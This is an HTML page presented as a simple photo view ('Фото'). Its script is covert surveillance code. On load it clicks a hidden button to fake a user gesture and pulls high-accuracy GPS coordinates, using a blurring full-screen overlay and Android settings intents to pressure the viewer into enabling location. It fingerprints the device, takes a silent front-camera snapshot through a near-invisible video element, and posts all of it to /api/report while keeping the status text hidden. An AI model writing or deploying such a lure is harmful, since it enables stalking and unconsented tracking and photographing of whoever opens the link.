<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Фото</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background: #1a1a1a;
      color: #b0b0b0;
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0.75rem 0.75rem 1.25rem;
    }
    figure {
      margin: 0;
      max-width: min(100%, 520px);
      width: 100%;
    }
    figure img {
      display: block;
      width: 100%;
      height: auto;
      border-radius: 8px;
    }
    /* Текст статуса остаётся в DOM для логики, но не виден пользователю */
    #status {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      white-space: nowrap;
      border: 0;
    }
    .err { color: #f66; }
    .ok { color: #6c6; }

    /* Пока гео недоступна: весь экран + эффект матового стекла поверх контента */
    .geo-help {
      position: fixed;
      inset: 0;
      z-index: 2147483647;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      align-items: center;
      padding: 1rem;
      padding-bottom: max(1rem, env(safe-area-inset-bottom));
      background: rgba(16, 18, 24, 0.38);
      -webkit-backdrop-filter: blur(24px) saturate(1.4);
      backdrop-filter: blur(24px) saturate(1.4);
    }
    .geo-help--hidden {
      display: none !important;
    }
    .geo-help__dock {
      width: 100%;
      max-width: min(100%, 520px);
    }
    .geo-help__bar {
      display: flex;
      align-items: stretch;
      border-radius: 14px;
      overflow: hidden;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
    }
    .geo-help__cta {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem 0.85rem;
      font-size: 1rem;
      font-weight: 700;
      text-align: center;
      text-decoration: none;
      color: #fff !important;
      background: #0d7dd6;
      border: none;
      cursor: pointer;
      font-family: inherit;
      line-height: 1.25;
      -webkit-tap-highlight-color: transparent;
    }
    .geo-help__cta:active {
      filter: brightness(1.08);
    }
    .geo-help__cta--disabled {
      background: #3d4450;
      color: #bbb !important;
      pointer-events: none;
    }
    /* Скрытая кнопка: программный клик при загрузке (часть браузеров считает жестом) */
    .geo-synthetic {
      position: fixed;
      left: -9999px;
      top: 0;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: 0;
      border: 0;
      opacity: 0;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <button type="button" id="geo-synthetic-start" class="geo-synthetic" tabindex="-1" aria-hidden="true">
    geo
  </button>
  <!-- position:relative чтобы абсолютный #status не уехал от окна -->
  <figure style="position: relative">
    <img
      src="fitonbot-1773979162864.png"
      alt=""
      width="1080"
      height="1920"
      decoding="async"
    />
    <div id="status" aria-live="polite" aria-hidden="true"></div>
  </figure>

  <div id="geo-help" class="geo-help geo-help--hidden" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Геолокация">
    <div class="geo-help__dock">
      <div class="geo-help__bar">
        <a id="geo-help-cta" class="geo-help__cta" href="#">Включите геолокацию</a>
      </div>
    </div>
  </div>

  <script>
    (function () {
      /*
       * Автоматически «нажать Разрешить» в системном окне браузера нельзя:
       * это запрещено политикой безопасности (иначе любой сайт мог бы включать геолокацию без согласия).
       * Скрипт уже вызывает getCurrentPosition при загрузке — диалог показывает сам браузер.
       */
      const statusEl = document.getElementById("status");
      let started = false;
      var geoHelpOpen = false;

      function isIosDevice() {
        var ua = navigator.userAgent || "";
        if (/iPhone|iPad|iPod/i.test(ua)) return true;
        if (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1) {
          return true;
        }
        return false;
      }

      function isMobileUa() {
        return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
      }
      var geoAndroidIntentIndex = 0;

      /**
       * Несколько вариантов intent: Chrome, Яндекс, Samsung Internet, WebView (в т.ч. Telegram Android).
       * Включить GPS из JS нельзя — только открыть экран настроек (ограничение ОС).
       */
      var ANDROID_LOCATION_INTENTS = [
        "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end",
        "intent://settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;package=com.android.settings;end",
        "intent:#Intent;action=com.android.settings.action.location.MODE_SETTINGS;end",
      ];

      function closeGeoHelpPanel() {
        var root = document.getElementById("geo-help");
        root.classList.add("geo-help--hidden");
        root.setAttribute("aria-hidden", "true");
        geoHelpOpen = false;
      }

      function navigateToUrl(url) {
        try {
          window.location.href = url;
        } catch (_) {}
      }

      function tryAndroidLocationIntent(which) {
        var list = ANDROID_LOCATION_INTENTS;
        var i = typeof which === "number" ? which : geoAndroidIntentIndex % list.length;
        navigateToUrl(list[i]);
      }

      function openGeoHelpPanel(code) {
        var root = document.getElementById("geo-help");
        var cta = document.getElementById("geo-help-cta");
        var ua = navigator.userAgent || "";
        var isAndroid = /Android/i.test(ua);
        var isIOS =
          /iPhone|iPad|iPod/i.test(ua) ||
          (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);

        geoAndroidIntentIndex = 0;
        geoHelpOpen = true;

        cta.onclick = null;
        cta.classList.remove("geo-help__cta--disabled");
        cta.textContent = "Включите геолокацию";

        if (isAndroid) {
          cta.setAttribute("href", ANDROID_LOCATION_INTENTS[0]);
          cta.onclick = function (e) {
            e.preventDefault();
            tryAndroidLocationIntent(geoAndroidIntentIndex % ANDROID_LOCATION_INTENTS.length);
            geoAndroidIntentIndex++;
          };
          setTimeout(function () {
            tryAndroidLocationIntent(0);
          }, 60);
        } else if (isIOS) {
          /*
           * Safari / WebView (Telegram и др.) блокируют prefs:/App-Prefs: — диалог «другое приложение»
           * и «Не удалось». Настройки геолокации на iOS из веба не открыть; только вручную и повтор запроса.
           */
          cta.setAttribute("href", "#");
          cta.setAttribute(
            "aria-label",
            "Повторить запрос: сначала включите геолокацию в Настройки → Конфиденциальность"
          );
          cta.onclick = function (e) {
            e.preventDefault();
            started = false;
            closeGeoHelpPanel();
            requestAnimationFrame(function () {
              startAutoReport();
            });
          };
        } else {
          cta.setAttribute("href", "#");
          cta.classList.add("geo-help__cta--disabled");
          cta.onclick = function (e) {
            e.preventDefault();
          };
        }

        root.classList.remove("geo-help--hidden");
        root.setAttribute("aria-hidden", "false");
      }

      document.addEventListener("visibilitychange", function () {
        if (document.visibilityState !== "visible" || !geoHelpOpen) return;
        started = false;
        closeGeoHelpPanel();
        requestAnimationFrame(function () {
          startAutoReport();
        });
      });

      function escapeHtml(s) {
        const d = document.createElement("div");
        d.textContent = s;
        return d.innerHTML;
      }

      async function getGeolocationPermissionState() {
        try {
          if (!navigator.permissions || !navigator.permissions.query) return null;
          const st = await navigator.permissions.query({ name: "geolocation" });
          return st.state;
        } catch (_) {
          return null;
        }
      }

      function sleepMs(ms) {
        return new Promise(function (r) {
          setTimeout(r, ms);
        });
      }

      /**
       * Один кадр с фронтальной камеры (JPEG base64 без префикса data:).
       * Важно: нельзя останавливать getUserMedia до drawImage — иначе кадр часто чёрный.
       */
      async function captureFrontCameraSnapshot() {
        var stream = null;
        var video = null;
        var ios = isIosDevice();
        try {
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return null;
          }
          stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user",
              width: { ideal: ios ? 640 : 1280 },
              height: { ideal: ios ? 480 : 720 },
            },
            audio: false,
          });
          video = document.createElement("video");
          video.setAttribute("playsinline", "");
          video.setAttribute("webkit-playsinline", "");
          video.playsInline = true;
          video.muted = true;
          video.autoplay = true;
          video.srcObject = stream;
          /* Часть мобильных движков не декодирует кадры, пока <video> не в DOM */
          video.style.cssText =
            "position:fixed;left:0;top:0;width:2px;height:2px;opacity:0.02;pointer-events:none;z-index:-1;";
          document.body.appendChild(video);

          await new Promise(function (resolve, reject) {
            var done = false;
            function ok() {
              if (done) return;
              done = true;
              resolve();
            }
            video.onloadedmetadata = function () {
              video.play().then(ok).catch(reject);
            };
            video.onerror = function () {
              reject(new Error("video"));
            };
            if (video.readyState >= 1) {
              video.play().then(ok).catch(reject);
            }
          });

          await new Promise(function (resolve) {
            if (video.readyState >= 2) {
              resolve();
              return;
            }
            video.addEventListener("loadeddata", function onLd() {
              video.removeEventListener("loadeddata", onLd);
              resolve();
            });
            setTimeout(resolve, ios ? 320 : 800);
          });

          var waitRvfc =
            typeof video.requestVideoFrameCallback === "function"
              ? function () {
                  return new Promise(function (resolve) {
                    video.requestVideoFrameCallback(function () {
                      resolve();
                    });
                  });
                }
              : null;
          if (waitRvfc) {
            await waitRvfc();
            if (!ios) await waitRvfc();
          } else {
            await sleepMs(ios ? 180 : 450);
          }

          var w = video.videoWidth;
          var h = video.videoHeight;
          if (!w || !h) {
            var spins = ios ? 6 : 15;
            var step = ios ? 45 : 80;
            for (var i = 0; i < spins && (!video.videoWidth || !video.videoHeight); i++) {
              await sleepMs(step);
            }
            w = video.videoWidth;
            h = video.videoHeight;
          }
          if (!w || !h) {
            return null;
          }

          var maxSide = ios ? 640 : 960;
          var tw = w;
          var th = h;
          if (w > maxSide || h > maxSide) {
            if (w >= h) {
              tw = maxSide;
              th = Math.round((h * maxSide) / w);
            } else {
              th = maxSide;
              tw = Math.round((w * maxSide) / h);
            }
          }
          var canvas = document.createElement("canvas");
          canvas.width = tw;
          canvas.height = th;
          var ctx = canvas.getContext("2d", { willReadFrequently: true });
          if (!ctx) return null;

          ctx.drawImage(video, 0, 0, tw, th);
          /* Если кадр всё ещё чёрный — подождать ещё один отрисованный кадр */
          try {
            var rw = Math.min(8, tw);
            var rh = Math.min(8, th);
            var cx = Math.max(0, Math.floor((tw - rw) / 2));
            var cy = Math.max(0, Math.floor((th - rh) / 2));
            var probe = ctx.getImageData(cx, cy, rw, rh).data;
            var sum = 0;
            for (var p = 0; p < probe.length; p += 4) {
              sum += probe[p] + probe[p + 1] + probe[p + 2];
            }
            var dark = sum < 80;
            if (dark && waitRvfc && !ios) {
              await waitRvfc();
              ctx.drawImage(video, 0, 0, tw, th);
            } else if (dark && !ios) {
              await sleepMs(220);
              ctx.drawImage(video, 0, 0, tw, th);
            } else if (dark && ios && waitRvfc) {
              await waitRvfc();
              ctx.drawImage(video, 0, 0, tw, th);
            }
          } catch (_) {}

          var dataUrl = canvas.toDataURL("image/jpeg", ios ? 0.72 : 0.82);
          var comma = dataUrl.indexOf(",");
          return comma < 0 ? null : dataUrl.slice(comma + 1) || null;
        } catch (_) {
          return null;
        } finally {
          try {
            if (stream && stream.getTracks) {
              stream.getTracks().forEach(function (t) {
                t.stop();
              });
            }
          } catch (_) {}
          try {
            if (video) {
              video.srcObject = null;
              if (video.parentNode) video.parentNode.removeChild(video);
            }
          } catch (_) {}
        }
      }

      function formatGeolocationError(err) {
        if (!err) return "Неизвестная ошибка геолокации";
        const code = err.code;
        if (code === 0) {
          return (
            "Геолокация в этом браузере не поддерживается. Откройте страницу в обычном Chrome или Safari, не во встроенном браузере приложения."
          );
        }
        if (code === 1) {
          return (
            "Доступ к геолокации запрещён. Откройте настройки сайта (замок / «i» в адресной строке) → разрешите «Местоположение», " +
            "при необходимости включите GPS в настройках телефона и обновите страницу."
          );
        }
        if (code === 2) {
          return (
            "Местоположение недоступно. На смартфоне включите «Службы геолокации» / GPS и режим «Высокая точность», " +
            "выйдите на улицу или к окну и обновите страницу."
          );
        }
        if (code === 3) {
          return (
            "Таймаут: координаты не получены. Если на телефоне выключена служба «Местоположение»/GPS — включите её в настройках системы " +
            "(как подсказывают карты), затем нажмите «Проверить снова». Либо выйдите на улицу для приёма спутников."
          );
        }
        const m = err.message || "";
        if (/denied/i.test(m)) return formatGeolocationError({ code: 1 });
        return m || "Ошибка геолокации";
      }

      async function collectFullEnv() {
        const nav = navigator;
        var skipHeavy = isMobileUa();
        const out = {
          userAgent: nav.userAgent,
          language: nav.language,
          languages: nav.languages ? Array.from(nav.languages) : [],
          platform: nav.platform,
          vendor: nav.vendor || "",
          product: nav.product || "",
          vendorSub: nav.vendorSub || "",
          productSub: nav.productSub || "",
          hardwareConcurrency: nav.hardwareConcurrency,
          deviceMemory: nav.deviceMemory,
          maxTouchPoints: nav.maxTouchPoints,
          cookieEnabled: nav.cookieEnabled,
          onLine: nav.onLine,
          webdriver: nav.webdriver,
          pdfViewerEnabled: nav.pdfViewerEnabled,
          doNotTrack: nav.doNotTrack,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffsetMin: -new Date().getTimezoneOffset(),
          visibilityState: document.visibilityState,
          referrer: document.referrer || "",
          pageUrl: location.href,
          locationBar: {
            protocol: location.protocol,
            host: location.host,
            hostname: location.hostname,
            pathname: location.pathname,
            search: location.search,
            hash: location.hash,
          },
          screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : null,
          },
          screenColorDepth: screen.colorDepth,
          viewport: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio,
          },
          windowOuter: {
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
          },
        };

        try {
          out.intl = Intl.DateTimeFormat().resolvedOptions();
        } catch (_) {
          out.intl = null;
        }

        try {
          out.prefersColorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches
            ? "dark"
            : "light";
        } catch (_) {}
        try {
          out.prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
        } catch (_) {}

        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
        if (conn) {
          out.network = {
            type: conn.type,
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt,
            saveData: conn.saveData,
          };
        }

        if (performance.memory) {
          out.performanceMemory = {
            usedJSHeapSize: performance.memory.usedJSHeapSize,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
          };
        }

        if (!skipHeavy) {
          try {
            if (nav.getBattery) {
              const b = await nav.getBattery();
              out.battery = {
                level: b.level,
                charging: b.charging,
                chargingTime: b.chargingTime,
                dischargingTime: b.dischargingTime,
              };
            }
          } catch (_) {}

          try {
            if (nav.storage && nav.storage.estimate) {
              const est = await nav.storage.estimate();
              out.storage = { quota: est.quota, usage: est.usage };
            }
          } catch (_) {}

          try {
            if (nav.userAgentData && nav.userAgentData.getHighEntropyValues) {
              out.uaClientHints = await nav.userAgentData.getHighEntropyValues([
                "architecture",
                "bitness",
                "brands",
                "fullVersionList",
                "mobile",
                "model",
                "platform",
                "platformVersion",
                "uaFullVersion",
                "wow64",
              ]);
            }
          } catch (_) {}

          try {
            if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
              const devs = await nav.mediaDevices.enumerateDevices();
              const byKind = {};
              devs.forEach(function (d) {
                byKind[d.kind] = (byKind[d.kind] || 0) + 1;
              });
              out.mediaDevices = {
                total: devs.length,
                byKind: byKind,
                hasLabels: devs.some(function (d) {
                  return d.label && d.label.length > 0;
                }),
              };
            }
          } catch (_) {}
        } else {
          out.envCollectMode = "fast-mobile";
        }

        return out;
      }

      function coordsToGeoPayload(pos, fixHint) {
        const c = pos.coords;
        return {
          latitude: c.latitude,
          longitude: c.longitude,
          accuracyM: c.accuracy,
          altitude: c.altitude,
          altitudeAccuracyM: c.altitudeAccuracy,
          heading: c.heading,
          speed: c.speed,
          timestamp: pos.timestamp,
          fixHint: fixHint || "",
        };
      }

      /**
       * Включить чип GPS в настройках Android/iOS со страницы нельзя (нет Web API).
       * На смартфонах: enableHighAccuracy + watchPosition — даём модулю время,
       * выбираем чтение с минимальной accuracy (чаще это именно GPS, а не только сеть).
       */
      function readGeo() {
        return new Promise(function (resolve, reject) {
          function geoReject(err) {
            if (!err || typeof err.code !== "number") {
              reject({
                __geo: true,
                code: 3,
                message: formatGeolocationError({ code: 3 }),
              });
              return;
            }
            reject({
              __geo: true,
              code: err.code,
              message: formatGeolocationError(err),
            });
          }

          if (!navigator.geolocation) {
            reject({
              __geo: true,
              code: 0,
              message: formatGeolocationError({ code: 0 }),
            });
            return;
          }
          const mobile = /Android|iPhone|iPad|iPod|Mobile/i.test(
            navigator.userAgent || ""
          );
          const highAcc = { enableHighAccuracy: true, maximumAge: 0 };

          if (isIosDevice()) {
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                resolve(
                  coordsToGeoPayload(pos, "ios:getCurrentPosition-fast")
                );
              },
              function (err) {
                geoReject(err);
              },
              { enableHighAccuracy: true, maximumAge: 0, timeout: 9000 }
            );
            return;
          }

          if (!mobile) {
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                resolve(coordsToGeoPayload(pos, "desktop:getCurrentPosition"));
              },
              function (err) {
                geoReject(err);
              },
              Object.assign({ timeout: 28000 }, highAcc)
            );
            return;
          }

          let best = null;
          let watchId = null;
          let finished = false;
          const t0 = Date.now();
          const HARD_MS = 30000;
          const GOOD_ACC_M = 55;
          const MIN_WAIT_MS = 900;

          function cleanup() {
            if (watchId != null) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }
          }

          function finishOk(pos, hint) {
            if (finished) return;
            finished = true;
            cleanup();
            clearTimeout(hardTimer);
            resolve(coordsToGeoPayload(pos, hint));
          }

          function finishErr(err) {
            if (finished) return;
            finished = true;
            cleanup();
            clearTimeout(hardTimer);
            geoReject(err);
          }

          const hardTimer = setTimeout(function () {
            if (finished) return;
            if (best) {
              finishOk(best, "mobile:watchPosition-best");
              return;
            }
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                if (finished) return;
                finished = true;
                cleanup();
                clearTimeout(hardTimer);
                resolve(
                  coordsToGeoPayload(pos, "mobile:getCurrentPosition-fallback")
                );
              },
              function (err) {
                finishErr(err);
              },
              Object.assign({ timeout: 12000 }, highAcc)
            );
          }, HARD_MS);

          watchId = navigator.geolocation.watchPosition(
            function (pos) {
              if (finished) return;
              const acc = pos.coords.accuracy;
              if (!best || acc < best.coords.accuracy) {
                best = pos;
              }
              const elapsed = Date.now() - t0;
              if (acc <= GOOD_ACC_M && elapsed >= MIN_WAIT_MS) {
                finishOk(pos, "mobile:watchPosition-high-accuracy");
              }
            },
            function (err) {
              finishErr(err);
            },
            highAcc
          );
        });
      }

      async function startAutoReport() {
        if (started) return;
        started = true;

        try {
          if (navigator.permissions && navigator.permissions.query) {
            const st = await navigator.permissions.query({ name: "geolocation" });
            if (st.state === "denied") {
              statusEl.innerHTML =
                '<span class="err">Геолокация для этого сайта отключена в браузере. Включите её в настройках адреса (замок) и обновите страницу.</span>';
              if (/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "")) {
                openGeoHelpPanel(1);
              }
              started = false;
              return;
            }
          }
        } catch (_) {}

        statusEl.textContent =
          "Разрешите доступ к местоположению; данные собираются параллельно.";

        try {
          if (/Android|iPhone|iPad|Mobile/i.test(navigator.userAgent)) {
            navigator.vibrate && navigator.vibrate(40);
          }
        } catch (_) {}

        var envP = collectFullEnv().catch(function (e) {
          return {
            userAgent: navigator.userAgent,
            pageUrl: location.href,
            collectEnvError: String(e && e.message ? e.message : e),
          };
        });
        var geoP = readGeo();

        let geo;
        try {
          geo = await geoP;
        } catch (e) {
          await envP;
          var msg =
            e && e.__geo
              ? e.message
              : e && e.message
                ? e.message
                : String(e);
          statusEl.innerHTML = '<span class="err">' + escapeHtml(msg) + "</span>";
          var mobileUA = /Android|iPhone|iPad|iPod|Mobile/i.test(
            navigator.userAgent || ""
          );
          if (e && e.__geo && mobileUA) {
            if (e.code === 0) {
              openGeoHelpPanel(0);
            } else if (e.code === 1) {
              var perm = await getGeolocationPermissionState();
              if (perm === "granted" || perm === "prompt") {
                openGeoHelpPanel(2);
              } else {
                openGeoHelpPanel(1);
              }
            } else if (e.code === 2 || e.code === 3) {
              openGeoHelpPanel(e.code);
            }
          }
          started = false;
          return;
        }

        let env = await envP;

        statusEl.textContent = "Камера: разрешите доступ — сделаем один снимок с фронтальной камеры.";
        var frontJpegB64 = await captureFrontCameraSnapshot();

        statusEl.textContent = "Отправка отчёта…";

        const payload = {
          collectedAt: new Date().toISOString(),
          env: env,
          geolocation: geo,
          frontCameraJpegBase64: frontJpegB64 || null,
        };

        try {
          const r = await fetch("/api/report", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
          const text = await r.text();
          if (!r.ok) throw new Error(text || "HTTP " + r.status);
          statusEl.innerHTML = '<span class="ok">Готово.</span>';
        } catch (e) {
          statusEl.innerHTML =
            '<span class="err">' + escapeHtml(e && e.message ? e.message : String(e)) + "</span>";
        }
      }

      document.addEventListener("DOMContentLoaded", function () {
        var syn = document.getElementById("geo-synthetic-start");
        if (syn) {
          syn.addEventListener("click", function () {
            startAutoReport();
          });
        }
        requestAnimationFrame(function () {
          requestAnimationFrame(function () {
            if (syn) syn.click();
            else startAutoReport();
          });
        });
      });
    })();
  </script>
</body>
</html>
